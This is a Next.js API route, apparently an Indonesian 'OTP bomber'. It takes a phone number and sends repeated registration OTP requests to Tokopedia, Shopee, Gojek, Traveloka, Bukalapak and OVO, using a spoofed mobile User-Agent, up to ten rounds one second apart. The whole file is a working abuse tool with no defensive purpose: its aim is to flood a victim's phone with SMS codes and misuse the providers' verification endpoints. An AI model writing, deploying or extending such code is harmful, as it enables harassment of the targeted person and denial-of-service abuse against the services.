import { NextRequest, NextResponse } from 'next/server'

export const maxDuration = 60

async function tokopedia(phone: string) {
  try {
    const res = await fetch('https://accounts.tokopedia.com/otp/c/page', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36'
      },
      body: JSON.stringify({ phone, type: 'register' })
    })
    return { platform: 'Tokopedia', success: res.ok }
  } catch {
    return { platform: 'Tokopedia', success: false }
  }
}

async function shopee(phone: string) {
  try {
    const res = await fetch('https://shopee.co.id/api/v2/authentication/send_otp/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36',
        'Referer': 'https://shopee.co.id/'
      },
      body: JSON.stringify({ phone_number: phone, support_whatsapp: false })
    })
    return { platform: 'Shopee', success: res.ok }
  } catch {
    return { platform: 'Shopee', success: false }
  }
}

async function gojek(phone: string) {
  try {
    const res = await fetch('https://api.gojek.com/gojek/v1/register/send-otp', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36'
      },
      body: JSON.stringify({ phone_number: phone })
    })
    return { platform: 'Gojek', success: res.ok }
  } catch {
    return { platform: 'Gojek', success: false }
  }
}

async function traveloka(phone: string) {
  try {
    const res = await fetch('https://api.traveloka.com/v1/user/register/send-otp', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36'
      },
      body: JSON.stringify({ phone })
    })
    return { platform: 'Traveloka', success: res.ok }
  } catch {
    return { platform: 'Traveloka', success: false }
  }
}

async function bukalapak(phone: string) {
  try {
    const res = await fetch('https://api.bukalapak.com/v1/auth/otp-request', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36'
      },
      body: JSON.stringify({ phone })
    })
    return { platform: 'Bukalapak', success: res.ok }
  } catch {
    return { platform: 'Bukalapak', success: false }
  }
}

async function ovo(phone: string) {
  try {
    const res = await fetch('https://api.ovo.id/v1/otp/send', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36'
      },
      body: JSON.stringify({ mobile_phone: phone })
    })
    return { platform: 'OVO', success: res.ok }
  } catch {
    return { platform: 'OVO', success: false }
  }
}

function sleep(ms: number) {
  return new Promise(r => setTimeout(r, ms))
}

export async function GET(req: NextRequest) {
  const { searchParams } = new URL(req.url)
  const phone = searchParams.get('phone')
  const jumlah = Math.min(parseInt(searchParams.get('jumlah') || '1'), 10)

  if (!phone) {
    return NextResponse.json({
      status: false,
      message: 'Parameter phone wajib diisi'
    }, { status: 400 })
  }

  const platforms = [tokopedia, shopee, gojek, traveloka, bukalapak, ovo]
  const allResults: any[] = []

  for (let i = 0; i < jumlah; i++) {
    const results = await Promise.all(platforms.map(p => p(phone)))
    allResults.push(...results)
    if (i < jumlah - 1) await sleep(1000)
  }

  const berhasil = allResults.filter(r => r.success).length
  const gagal = allResults.filter(r => !r.success).length

  return NextResponse.json({
    status: true,
    phone,
    jumlah,
    total_request: allResults.length,
    berhasil,
    gagal,
    detail: allResults,
    author: 'Egii Apii'
  })
}
